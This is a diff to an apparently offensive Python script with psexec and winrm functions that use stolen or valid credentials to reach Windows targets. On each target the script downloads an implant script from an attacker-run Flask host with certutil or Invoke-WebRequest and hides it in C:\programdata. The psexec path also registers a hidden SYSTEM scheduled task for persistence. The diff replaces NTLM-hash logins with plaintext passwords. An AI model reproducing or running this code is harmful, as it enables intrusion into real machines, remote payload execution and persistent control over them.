@@ -1,5 +1,4 @@
 import pwn
-import hashlib, binascii
 import base64
 import paramiko
 import os
@@ -9,11 +8,10 @@ import random
 With valid credentials, psexec and run implant code
 """
 def psexec(username, password, target, FLASK_HOST, FLASK_PORT):
-    ntlm = binascii.hexlify(hashlib.new('md4', password.encode('utf-16le')).digest()).decode(encoding="utf-8")
     rnum = random.randint(1, 1000)
     cmd = f'certutil.exe -f -split -urlcache http://{FLASK_HOST}:{FLASK_PORT}/static/win.ps1 C:\\programdata\\win.ps1; schtasks /create /tn "agent{rnum}" /tr "powershell -nop -w hidden C:\\Programdata\\win.ps1" /sc onstart /ru system /rl highest /f; schtasks /run /tn "agent{rnum}"'
     b64 = base64.b64encode(cmd.encode("utf-16")[2:]).decode("utf-8")
-    os_cmd = f"/usr/bin/impacket-psexec -hashes :{ntlm} {username}@{target} 'powershell -e {b64}'"
+    os_cmd = f"/usr/bin/impacket-psexec {username}'{password}'@{target} 'powershell -e {b64}'"
     print(os_cmd)
     os.system(os_cmd)
 
@@ -21,9 +19,7 @@ def psexec(username, password, target, FLASK_HOST, FLASK_PORT):
 With valid credentials, winrm and run implant code
 """
 def winrm(username, password, target, FLASK_HOST, FLASK_PORT):
-    ntlm = binascii.hexlify(hashlib.new('md4', password.encode('utf-16le')).digest()).decode(encoding="utf-8")
-
-    p = pwn.process(["/usr/bin/evil-winrm", "-i", f"{target}", "-u", f"{username}", "-H", f"{ntlm}"], stdin=pwn.PTY)
+    p = pwn.process(["/usr/bin/evil-winrm", "-i", f"{target}", "-u", f"{username}", "-p", f"{password}"], stdin=pwn.PTY)
     
     # Download payload to disk
     payload = f'iwr "http://{FLASK_HOST}:{FLASK_PORT}/static/win.ps1" -o C:\\programdata\\win.ps1; powershell -nop -w hidden C:\\programdata\\win.ps1'
